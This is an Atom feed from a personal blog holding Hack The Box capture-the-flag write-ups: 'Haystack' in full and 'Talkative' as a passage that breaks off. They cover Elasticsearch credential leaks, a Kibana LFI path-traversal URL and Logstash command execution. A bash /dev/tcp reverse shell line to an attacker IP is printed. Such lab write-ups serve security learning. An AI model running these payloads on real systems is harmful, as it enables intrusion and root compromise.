<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-11-04T03:21:45+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Easy] - Haystack</title><link href="http://localhost:4000/2022/10/28/Haystack.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Haystack" /><published>2022-10-28T00:00:00+02:00</published><updated>2022-10-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/28/Haystack</id><content type="html" xml:base="http://localhost:4000/2022/10/28/Haystack.html"><![CDATA[<p><img src="/assets/Haystack/Haystack.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>Haystack</strong> was a quite nice <strong>Linux</strong> box. it had an <strong>unprotected Elasticsearch</strong> instance which let us <strong>enumerate all indeces</strong> (<em>equivalent to database tables</em>).</li>
  <li><em>Hidden amongst the data,</em> was a <strong>username and password</strong> encoded in <strong>base64</strong>. Those worked and got us on the box via <strong>SSH</strong>.</li>
  <li><em>On the box,</em> we detected a <strong>locally-listening Kibana interface</strong> which we <strong>exposed with an SSH tunnel.</strong></li>
  <li><em>After fingerprinting Kibana,</em> we found the version <strong>vulnerable to Local File Inclusion</strong> which <strong>could lead to RCE</strong> if we could <strong>write a shell somewhere on the host.</strong></li>
  <li><em>Having access to file system,</em> we placed a <strong>JavaScript reverse shell</strong> in the <code class="language-plaintext highlighter-rouge">/tmp</code> folder and <strong>included it using the LFI</strong> to <strong>get a shell</strong> as the <code class="language-plaintext highlighter-rouge">kibana</code> user.</li>
  <li><em>Noticing the</em> <strong><em>Logstash</em></strong> <em>service running as</em> <code class="language-plaintext highlighter-rouge">root</code>, we checked if we can <strong>modify or abuse its filters</strong> to <strong>run commands in a privileged context.</strong></li>
  <li><em>The filters weren’t writable,</em> but they <strong>ran commands from a directory where we had write access.</strong></li>
  <li><em>After</em> <strong><em>placing a file with a matching name</em></strong> <em>and</em> <strong><em>inserting our command in the expected format,</em></strong> our code <strong>got executed</strong> as <code class="language-plaintext highlighter-rouge">root</code> and we owned the box.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION              
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:                                                                                                    
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2                                                                               
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.12.2          
9200/tcp open  http    nginx 1.12.2                                                                               
| http-methods:                                                                                                   
|_  Potentially risky methods: DELETE                                                                             
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).                      
|_http-server-header: nginx/1.12.2 
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">nmap</code> result showed:</p>
<ul>
  <li><strong>SSH</strong> on its default port <em>(that version allows for username enumeration)</em></li>
  <li><strong>HTTP</strong> on both ports <strong>80</strong> and <strong>9200</strong></li>
</ul>

<h2 id="checking-port-80">Checking Port 80</h2>
<p>Here we only saw a picture of well.. <strong><em>a needle in a haystack :)</em></strong></p>

<p><img src="/assets/Haystack/port-80-image.jpg" alt="" /></p>

<p>we used <code class="language-plaintext highlighter-rouge">wget</code> to <strong>download it</strong> and then <strong>checked for useful info in it’s metadata</strong> using <code class="language-plaintext highlighter-rouge">exiftool</code></p>

<p><img src="/assets/Haystack/download-and-exif-needle-jpeg.jpg" alt="" /></p>

<p>but we did’t find anything there.</p>

<p>we also ran <code class="language-plaintext highlighter-rouge">gobuster</code> to <strong>search for endpoints</strong> but without anything new. so we moved on.</p>

<h2 id="enumerating-elasticsearch">Enumerating Elasticsearch</h2>
<p><em>On port 9200,</em> we instantly noticed a keyword: <strong>“Elasticsearch”</strong></p>

<p><img src="/assets/Haystack/elastic-search-found.jpg" alt="" /></p>

<p><strong>Enumerating Elastic</strong> is pretty straightforward following this awesome <a href="https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch">HackTricks</a> page.</p>

<p><em>before we start,</em> some <strong>basic Elasticsearch terminology</strong>:</p>

<ul>
  <li><strong>An Index</strong> is a <strong>collection of documents</strong></li>
  <li><strong>A Document</strong> is a <strong>set of JSON-formatted key-value pairs</strong></li>
</ul>

<p><em>Per index,</em> we want to <strong>retrieve as many documents</strong> as we can so we can <strong>access the most amount of data.</strong></p>

<p><em>to get the list of indeces,</em> we can use <code class="language-plaintext highlighter-rouge">curl</code> to send a <strong>GET request</strong> to the <code class="language-plaintext highlighter-rouge">/_cat/indices?v</code> endpoint.</p>

<p><img src="/assets/Haystack/cat-elastic-indeces.jpg" alt="" /></p>

<p><em>doing that,</em> we get back:</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">.kibana</code></li>
  <li><code class="language-plaintext highlighter-rouge">quotes</code></li>
  <li><code class="language-plaintext highlighter-rouge">bank</code></li>
</ol>

<p><strong><em>to get the documents for each index,</em></strong> we will again use <code class="language-plaintext highlighter-rouge">curl</code> but with a <strong>different URL format:</strong> <code class="language-plaintext highlighter-rouge">/&lt;INDEX_NAME&gt;/_search?size=&lt;NUMBER_OF_DOCUMENTS&gt;</code></p>

<p>and will <strong>pipe the JSON output</strong> to <code class="language-plaintext highlighter-rouge">jq</code> to make it <strong>prettier and more accessible.</strong></p>

<p><em>starting with the</em> <code class="language-plaintext highlighter-rouge">.kibana</code> <em>index,</em> we didn’t find anything signicant there.</p>

<p><img src="/assets/Haystack/kibana-index.jpg" alt="" /></p>

<p>so we went for the <code class="language-plaintext highlighter-rouge">quotes</code> index next.</p>

<p><img src="/assets/Haystack/quotes-index.jpg" alt="" /></p>

<p>it <em>initially</em> looked like a <strong>bunch of junk</strong>. but <strong><em>it also looked like a haystack :D</em></strong></p>

<p>where was the needle, though?</p>

<p><strong><em>to take a shortcut and to try making the search easier,</em></strong> we decided to <strong>search for any special characters</strong> using <code class="language-plaintext highlighter-rouge">grep</code></p>

<p>the logic was to <strong>find anything that’s NOT normal text.</strong></p>

<p><em>when grepping for the</em> <code class="language-plaintext highlighter-rouge">:</code>, we <strong>found two needles :D</strong></p>

<p><img src="/assets/Haystack/finding-two-needles.jpg" alt="" /></p>

<p><em>since it was</em> <strong><em>in spanish,</em></strong> we used <strong>Google Translate</strong></p>

<p><img src="/assets/Haystack/spanish-translate.jpg" alt="" /></p>

<p><em>noticing from the trailing</em> <code class="language-plaintext highlighter-rouge">=</code>, we knew they were both likely <strong>base64-encoded.</strong></p>

<p>decoding them gave us <code class="language-plaintext highlighter-rouge">security</code> and <code class="language-plaintext highlighter-rouge">spanish.is.key</code> which were <strong>a valid username and password for SSH</strong>.</p>

<p><img src="/assets/Haystack/ssh-as-security.jpg" alt="" /></p>

<h2 id="lateral-movement-via-exploiting-kibana">Lateral Movement via Exploiting Kibana</h2>
<p><em>Right after logging in,</em> we ran a quick <a href="https://github.com/carlospolop/PEASS-ng">linpeas</a> to see <strong>what can help us privesc.</strong></p>

<p><em>after checking a couple of things,</em> we noticed <strong>a new set of local ports listening:</strong></p>

<p><img src="/assets/Haystack/locally-listening-ports.jpg" alt="" /></p>

<p><em>so, to check those,</em>  we <strong>leveraged our SSH access</strong> to easily <strong>create tunnels:</strong></p>

<p><img src="/assets/Haystack/ssh-tunnels.jpg" alt="" /></p>

<p><em>starting with port 5601,</em> we found <strong>Kibana</strong></p>

<p><img src="/assets/Haystack/discovering-kibana.jpg" alt="" /></p>

<p><strong><em>in its management tab,</em></strong> we could <strong>detect the version</strong></p>

<p><img src="/assets/Haystack/kibana-version.jpg" alt="" /></p>

<p>And <strong>a quick search on Google</strong> revealed an <strong>available PoC</strong> on <a href="https://github.com/mpgn/CVE-2018-17246">Github</a></p>

<p><img src="/assets/Haystack/kibana-exploit-search-google.jpg" alt="" /></p>

<p><em>checking it,</em> we noticed that <strong>this exploit was exactly suited to our situation</strong> <em>(having write access on the machine).</em></p>

<p><img src="/assets/Haystack/kibana-lfi-github.jpg" alt="" /></p>

<p>we needed to <strong>place a JavaScript reverse shell</strong> somewhere <strong>readable to all users on the box</strong> (like <code class="language-plaintext highlighter-rouge">/tmp</code>) then <strong>include it.</strong></p>

<p>this <strong>code</strong> for it was <strong>on the same Github repository.</strong></p>

<p><img src="/assets/Haystack/JS-rev-shell-code.jpg" alt="" /></p>

<p>we created <code class="language-plaintext highlighter-rouge">rev.js</code> using <code class="language-plaintext highlighter-rouge">vi</code> and <strong>modified both the host and port</strong></p>

<p><img src="/assets/Haystack/rev-js-created.jpg" alt="" /></p>

<p>then <strong>triggered the LFI</strong> at <code class="language-plaintext highlighter-rouge">/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../tmp/rev.js</code></p>

<p><img src="/assets/Haystack/got-rev-as-kibana.jpg" alt="" /></p>

<p>we were now inside as the <code class="language-plaintext highlighter-rouge">kibana</code> user.</p>

<h2 id="exploiting-logstash-for-privilege-escalation">Exploiting Logstash for Privilege Escalation</h2>
<p><em>Previously, when we ran</em> <code class="language-plaintext highlighter-rouge">linpeas</code>, we had saw something interesting:</p>

<p>the <strong>Logstash process was running as</strong> <code class="language-plaintext highlighter-rouge">root</code></p>

<p><img src="/assets/Haystack/logstash-running-as-root.jpg" alt="" /></p>

<p>the <strong>“logstash” word</strong> was <strong>highlighted in blue</strong>.</p>

<p><em>but if we broke it down,</em> it’s <strong>rather simple:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/java <span class="se">\</span>
<span class="nt">-Xms500m</span> <span class="se">\</span>
<span class="nt">-Xmx500m</span> <span class="se">\</span>
<span class="nt">-XX</span>:+UseParNewGC <span class="se">\</span>
<span class="nt">-XX</span>:+UseConcMarkSweepGC <span class="se">\</span>
<span class="nt">-XX</span>:CMSInitiatingOccupancyFraction<span class="o">=</span>75 <span class="se">\</span>
<span class="nt">-XX</span>:+UseCMSInitiatingOccupancyOnly <span class="se">\</span>
<span class="nt">-Djava</span>.awt.headless<span class="o">=</span><span class="nb">true</span> <span class="se">\</span>
<span class="nt">-Dfile</span>.encoding<span class="o">=</span>UTF-8 <span class="se">\</span>
<span class="nt">-Djruby</span>.compile.invokedynamic<span class="o">=</span><span class="nb">true</span> <span class="se">\</span>
<span class="nt">-Djruby</span>.jit.threshold<span class="o">=</span>0 <span class="se">\</span>
<span class="nt">-XX</span>:+HeapDumpOnOutOfMemoryError <span class="se">\</span>
<span class="nt">-Djava</span>.security.egd<span class="o">=</span>file:/dev/urandom <span class="se">\</span>
<span class="nt">-cp</span> 
/usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar: 
/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar: 
..SNIP..
/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar: 
/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar
org.logstash.Logstash <span class="se">\</span>
<span class="nt">--path</span>.settings /etc/logstash
</code></pre></div></div>

<p>these were just <strong>some command-line arguments</strong> to start up <code class="language-plaintext highlighter-rouge">Logstash</code> with <strong>a specific configuration.</strong></p>

<p><em>from the last argument:</em> <code class="language-plaintext highlighter-rouge">--path.settings /etc/logstash</code>, we know that <code class="language-plaintext highlighter-rouge">/etc/logstash</code> would be <strong>an interesting place to look</strong> for ways to exploit.</p>

<p><em>specially,</em> when <code class="language-plaintext highlighter-rouge">linpeas</code> has pointed out that <strong>the files within were ONLY readable by our now-owned</strong> <code class="language-plaintext highlighter-rouge">kibana</code> <strong>user.</strong></p>

<p><img src="/assets/Haystack/logstash-files-found.jpg" alt="" /></p>

<p>Looking at <strong>the files in the main Logstash configuration</strong> looked promising.</p>

<p><img src="/assets/Haystack/checking-logstash-conf-files.jpg" alt="" /></p>

<p><em>Without any research,</em> you could <strong>get the gist</strong> of what’s within just by <strong><em>assembling the pieces together</em></strong>.</p>

<p><img src="/assets/Haystack/logstash-understanding-files.jpg" alt="" /></p>

<p><strong><em>knowing that the process is running as</em></strong> <code class="language-plaintext highlighter-rouge">root</code>, merely <strong>seeing the sentence “Execute command” here</strong> is enough to <strong>confirm that we’re on the right path.</strong></p>

<p><em>So, to understand the mechanics here,</em> we <strong>searched Google</strong> for <strong>“Logstash configuration”</strong> and found the <a href="https://www.elastic.co/guide/en/logstash/current/configuration.html">official documenation</a> sufficient.</p>

<p><em>to exploit this situation,</em> we will need to <strong>place a file whose name begins with “logstash_“</strong> in the <code class="language-plaintext highlighter-rouge">/opt/kibana</code> directory. just as the <code class="language-plaintext highlighter-rouge">input.conf</code> suggests:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>input {
    file {
        path =&gt; "/opt/kibana/logstash_*"
        start_position =&gt; "beginning"
        sincedb_path =&gt; "/dev/null"
        stat_interval =&gt; "10 second"
        type =&gt; "execute"
        mode =&gt; "read"
    }
}
</code></pre></div></div>

<p>and <strong>make sure it matches</strong> the <code class="language-plaintext highlighter-rouge">filter.conf</code> criteria:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>filter {
    if [type] == "execute" {
        grok {
            match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
        }
    }
}
</code></pre></div></div>

<p><strong><em>translating this regular expression,</em></strong> our <code class="language-plaintext highlighter-rouge">logstash_</code> file should contain:</p>

<p><code class="language-plaintext highlighter-rouge">Ejecutar</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">commando</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">:</code> + <code class="language-plaintext highlighter-rouge">&lt;whitespace&gt;</code> + <code class="language-plaintext highlighter-rouge">&lt;command&gt;</code></p>

<p>so that <strong>the “commando” argument would get executed</strong> as in <code class="language-plaintext highlighter-rouge">output.conf</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>output {
    if [type] == "execute" {
        stdout { codec =&gt; json }
        exec {
            command =&gt; "%{comando} &amp;"
        }
    }
}
</code></pre></div></div>

<p><strong><em>to own this box,</em></strong> we would do something like <strong>place a reverse shell in the</strong> <code class="language-plaintext highlighter-rouge">commando</code> <strong>argument’s place</strong> like below:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.16.9/9000 0&gt;&amp;1
</code></pre></div></div>

<p><strong><em>which works like a charm :D</em></strong></p>

<p><img src="/assets/Haystack/rooting_the_box.jpg" alt="" /></p>

<p><strong>está muerto..</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Hard] - Talkative</title><link href="http://localhost:4000/2022/10/19/Talkative.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Hard] - Talkative" /><published>2022-10-19T00:00:00+02:00</published><updated>2022-10-19T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/19/Talkative</id><content type="html" xml:base="http://localhost:4000/2022/10/19/Talkative.html"><![CDATA[<p><img src="/assets/Talkative/Talkative.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>Talkative</strong> is a <strong>Linux</strong> box with a <strong>long chain of exploitation</strong> that goes <strong><em>through several containers</em></strong> to finally crack the host.</li>
  <li>The <strong>intial foothold</strong> is through <strong>an analytics web app</strong> called <strong>Jamovi</strong> that was on <strong>port 8080</strong>. It had a <strong>plugin called “RJ Editor”</strong> which allowed us to <strong>run system commands</strong> using <strong>the R language.</strong></li>
  <li><strong><em>With an R reverse shell,</em></strong> we <strong>got on that application’s container</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</li>
  <li>We attempted to <strong>break out of it</strong> and <strong>get on the host</strong> but couldn’t find a way to do that.</li>
  <li><em>On the filesystem,</em> the <code class="language-plaintext highlighter-rouge">/root</code> directory contained <strong>an archive</strong> called <code class="language-plaintext highlighter-rouge">Bolt-Administration</code> which <strong>contained 3 sets of credentials.</strong></li>
  <li>We <strong>reused the passwords</strong> we found on the <strong>Bolt CMS instance</strong> on <strong>port 80</strong> and <strong>could log in</strong> with the <code class="language-plaintext highlighter-rouge">admin</code> username.</li>
  <li><em>Because Bolt CMS used the</em> <strong>Twig PHP template engine</strong>, we were able to <strong>edit a template</strong> to <strong>obtain RCE</strong> using <strong>Server-Side Template Injection (SSTI) payloads.</strong></li>
  <li>We got a shell as <code class="language-plaintext highlighter-rouge">www-data</code> within <strong>the Bolt container</strong>. <em>And from it,</em> we could <code class="language-plaintext highlighter-rouge">SSH</code> to the host <strong>using the credentials we found</strong> (<em>port 22 was only exposed to this container</em>).</li>
  <li><em>On the host,</em> we <strong>uploaded a standalone version of</strong> <code class="language-plaintext highlighter-rouge">nmap</code> and did a <strong>full port scan</strong> on <strong>all the hosted docker instances.</strong></li>
  <li><strong>One of the containers</strong> had <strong>port 27017 open</strong>. The <strong>default port for MongoDB.</strong></li>
  <li>We set up <code class="language-plaintext highlighter-rouge">chisel</code> to <strong>forward any connections</strong> from our Kali to that port. And <strong>could access the Mongo database</strong> <em>through the tunnel</em> <strong><em>without authentication</em></strong>.</li>
  <li><em>While checking it,</em> we <strong>found the database for RocketChat</strong> which we could alter.</li>
  <li><em>To abuse that,</em> we <strong>changed the role</strong> to <code class="language-plaintext highlighter-rouge">admin</code> for <strong>a user that we had previously registerted</strong> with a <strong>NoSQL update statement</strong>.</li>
  <li>We could <strong>obtain RCE</strong> through the app by <strong>creating an Integration</strong> for an <strong>incoming web hook</strong> that had the ability to <strong>run server-side JavaScript</strong> when triggered.</li>
  <li><em>After getting</em> <strong><em>a reverse shell on the RocketChat container</em></strong> <em>as</em> <code class="language-plaintext highlighter-rouge">root</code>, we <strong>installed a few dependencies</strong> to fix errors related to <strong>the detection of dangerous capabilities.</strong></li>
  <li><em>After that,</em> we could see the present <code class="language-plaintext highlighter-rouge">cap_dac_read_search</code> and <code class="language-plaintext highlighter-rouge">cap_dac_override</code> capabilities and could <strong>exploit them</strong> to <strong>write an SSH public key</strong> over the host’s <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> thus granting us <strong>SSH access</strong> to it as <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Thu Sep  8 05:52:25 2022 as: nmap -sC -sV --version-all -oN 10.10.11.155-full-scan.nmap -p 22,80,3000,8080,8081,8082 10.10.11.155
Nmap scan report for talkative (10.10.11.155)
Host is up (0.12s latency).

PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://talkative.htb
|_http-server-header: Apache/2.4.52 (Debian)
3000/tcp open     ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: Bcy5tmWBNwCAATRnA
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Thu, 08 Sep 2022 09:52:38 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;
|     &lt;meta charset="utf-8" /&gt;
|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;
|     &lt;meta http-equiv="expires" content="-1" /&gt;
|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
|     &lt;meta name="fragment" content="!" /&gt;
|     &lt;meta name="distribution" content="global" /&gt;
|     &lt;meta name="rating" content="general" /&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;
|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;
|     &lt;meta name="apple-mobile-web-app-capable" conten
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: Bcy5tmWBNwCAATRnA
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Thu, 08 Sep 2022 09:52:39 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;
|     &lt;meta charset="utf-8" /&gt;
|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;
|     &lt;meta http-equiv="expires" content="-1" /&gt;
|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
|     &lt;meta name="fragment" content="!" /&gt;
|     &lt;meta name="distribution" content="global" /&gt;
|     &lt;meta name="rating" content="general" /&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;
|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;
|     &lt;meta name="apple-mobile-web-app-capable" conten
|   Help, NCP: 
|_    HTTP/1.1 400 Bad Request
8080/tcp open     http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
8082/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">nmap</code> gives us <strong>a lot of ports</strong> to check out: <strong>80, 3000 and 8080 through 8082</strong>. <strong>SSH</strong> is there but <em>filtered</em> which suggest it’s closed off by a firewall or something.</p>

<ul>
  <li><strong>Port 80</strong> redirects to <code class="language-plaintext highlighter-rouge">http://talkative.htb</code>. so we have <strong>a host name</strong> to add to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and we might want to <strong>search for other vhosts.</strong></li>
  <li><strong>Port 3000</strong> seems to be a <strong>web application.</strong></li>
  <li><strong>Port 8080</strong> has <strong>Jamovi</strong> as a title which seems interesting.</li>
  <li><strong>Ports 8081 and 8082</strong> give a <code class="language-plaintext highlighter-rouge">404 - Not Found</code>. there might be more to them.</li>
  <li><em>And Lastly,</em> <strong>all 808X ports</strong> are hosted on a <strong>different type of web server</strong> called <strong>“Tornado httpd”</strong> with a version of 5.0 (we could check if it’s vulnerble)</li>
</ul>

<h2 id="checking-out-port-80">Checking Out Port 80</h2>
<p><em>After modifying the</em> <code class="language-plaintext highlighter-rouge">/etc/hosts</code> <em>file with the</em> <code class="language-plaintext highlighter-rouge">talkative.htb</code> <em>hostname</em>, we visit the website:</p>

<p><img src="/assets/Talkative/Port-80-wappalyzer.jpg" alt="" /></p>

<p><strong>Wappalyzer</strong> shows us it’s running <strong>Bolt CMS</strong> and <strong>PHP as its server-side language</strong>. Good to know.</p>

<p>we also find a <strong>list of usernames</strong> there:</p>

<p><img src="/assets/Talkative/port-80-usernames-and-links.jpg" alt="" /></p>

<p>each user’s <strong>“Read More”</strong> link takes us to <strong>another page with his email in it</strong>:</p>

<p><img src="/assets/Talkative/janit-user-mail.jpg" alt="" /></p>

<p>we get 3 usernames/emails:</p>

<ol>
  <li><strong>Janit Smith</strong> [janit@talkative.htb]</li>
  <li><strong>Saul Goodman</strong> [saul@talkative.htb]</li>
  <li><strong>Matt Williams</strong> [matt@talkative.htb]</li>
</ol>

<p><em>looking down at the bottom,</em> we also find <strong>references to 3 products</strong></p>

<p><img src="/assets/Talkative/port-80-products.jpg" alt="" /></p>

<h3 id="1-talkzone">1. TALKZONE</h3>
<p>the first one was <em>a bit vague</em></p>

<p><img src="/assets/Talkative/port-80-talkzone.jpg" alt="" /></p>

<h3 id="2-talkforbiz-coming-soon">2. TALKFORBIZ (Coming Soon)</h3>

<p>the second one talked about an application called <strong>“RocketChat”</strong> where it’s <strong>free to register</strong> an account.</p>

<p><img src="/assets/Talkative/port-80-talkforbiz-rocket-chat-hint.jpg" alt="" /></p>

<h3 id="3-talk-a-stats-coming-soon">3. TALK-A-STATS (Coming Soon)</h3>

<p><strong>Jamovi</strong> is mentioned third and there was <strong>a link</strong> to it as well.</p>

<p><img src="/assets/Talkative/port-80-talkastats.jpg" alt="" /></p>

<p><em>But apart from that,</em> <strong>there wasn’t much here</strong> to played with. So we moved on..</p>

<h2 id="checking-port-3000">Checking Port 3000</h2>

<p><em>Over port 3000,</em> we found <strong>the homepage for RocketChat</strong>. It indeed <strong>allowed registration</strong> as mentioned above.</p>

<p><img src="/assets/Talkative/port-3000-rocket-registration.jpg" alt="" /></p>

<p>We <strong>could register</strong> with <code class="language-plaintext highlighter-rouge">test@talkative.htb</code> (trying other domains like <code class="language-plaintext highlighter-rouge">@test.com</code> didn’t work).</p>

<p>The <strong>“Channels”</strong> area had one channel: <strong>“#general”</strong> and there wasn’t any information there.</p>

<p><img src="/assets/Talkative/port-3000-empty-chat.jpg" alt="" /></p>

<p><em>Before diving any deeper here doing stuff like</em> <strong><em>fingerprinting the web app’s version</em></strong> <em>and</em> <em>searching for exploits,</em> we decided to first <strong>take a quick look on Jamovi</strong>.</p>

<h2 id="the-jamovi-web-app-and-container">The Jamovi Web App and Container</h2>

<p>The home page had <strong>an indicator of a vulnerability.</strong></p>

<p><img src="/assets/Talkative/jamovi-first-look.jpg" alt="" /></p>

<p><em>On the toolbar above,</em> there was <strong>an “R” icon</strong> which had a drop-down menu. It had something called <strong>“RJ Editor”.</strong></p>

<p><img src="/assets/Talkative/jamovi-rj-editor.jpg" alt="" /></p>

<p><em>When checking it out,</em> it seemed like <strong>a web console</strong> where we could <strong>run code.</strong></p>

<p><img src="/assets/Talkative/jamovi-rj-editor-code.jpg" alt="" /></p>

<p><strong>“R”</strong> is a <strong>programming language</strong> commonly used for <strong>statistics-related stuff</strong>. <strong><em>But can we abuse it?</em></strong></p>

<p>we searched <strong>Google</strong> for <strong>“r reverse shell”</strong></p>

<p><img src="/assets/Talkative/search-r-reverse-shell.jpg" alt="" /></p>

<p>and found this <a href="https://gist.github.com/trietptm/05f385df4d2d8c0ee35b217e7307e462">Github gist</a> as the first result</p>

<p><img src="/assets/Talkative/r-reverse-shell-gist.jpg" alt="" /></p>

<p>it got us <strong>a shell</strong> as <code class="language-plaintext highlighter-rouge">root</code></p>

<p><img src="/assets/Talkative/jamovi-container-rooted.jpg" alt="" /></p>

<p><em>the first thing we noticed after getting in,</em> was <strong>being in a container</strong> (telling by the <code class="language-plaintext highlighter-rouge">.dockerenv</code> file in the system root).</p>

<p><img src="/assets/Talkative/jamovi-container.jpg" alt="" /></p>

<h3 id="finding-creds-in-the-root-users-directory">Finding Creds in the Root User’s Directory</h3>

<p><em>In</em> <code class="language-plaintext highlighter-rouge">/root</code>, we found <strong>an interesting file:</strong> <code class="language-plaintext highlighter-rouge">bolt-administration.omv</code></p>

<p><img src="/assets/Talkative/jamovi-container-root-dir.jpg" alt="" /></p>

<p><em>But since the</em> <code class="language-plaintext highlighter-rouge">unzip</code> <em>utility wasn’t there on the docker,</em> we used a <strong>bash trick</strong> -<em>commonly-used in reverse shells</em>- to <strong>transfer it back</strong> to our Kali.</p>

<p><img src="/assets/Talkative/file-transfer-without-nc.jpg" alt="" /></p>

<p><em>Having</em> <strong><em>verified the file’s integrity</em></strong> <em>using</em> <code class="language-plaintext highlighter-rouge">md5sum</code>, we <strong>unzipped the archive</strong>.</p>

<p><img src="/assets/Talkative/unzipping-bolt-archive.jpg" alt="" /></p>

<p>the <code class="language-plaintext highlighter-rouge">xdata.json</code> file within had the <strong><em>kind of loot we were looking for :D</em></strong></p>

<p><img src="/assets/Talkative/bolt-archive-loot.jpg" alt="" /></p>

<p><em>from the file’s name,</em> we know that <strong>the creds inside should work for Bolt.</strong></p>

<p><em>but before taking that route,</em> we opted to do <strong>a couple of important checks</strong> first.</p>

<h3 id="check-1-scanning-our-subnet-and-attempting-to-reach-the-host">Check #1: Scanning our Subnet and Attempting to Reach the Host</h3>

<p>we wanted to <strong>discover the container environment</strong> and see if we can <strong>reach the host</strong> spawning our docker.</p>

<p><em>if the host</em> <strong><em>exposed its SSH port</em></strong> <em>to our container,</em> we could try <strong>reusing the creds</strong> we found there.</p>

<p>we first <strong>get our docker’s IP</strong> using <code class="language-plaintext highlighter-rouge">hostname -i</code></p>

<p><img src="/assets/Talkative/jamovi-container-ip.jpg" alt="" /></p>

<p>we were at <code class="language-plaintext highlighter-rouge">172.18.0.2</code>.</p>

<p><em>Usually,</em> the host <strong>holds the first IP</strong> on the subnet (<em>here,</em> that would be <code class="language-plaintext highlighter-rouge">172.18.0.1</code>).</p>

<p><em>To confirm this,</em> we needed either <code class="language-plaintext highlighter-rouge">ping</code> or <code class="language-plaintext highlighter-rouge">ssh</code>. but <strong><em>neither was available :/</em></strong></p>

<p><img src="/assets/Talkative/jamovi-container-no-ping-no-ssh-client.jpg" alt="" /></p>

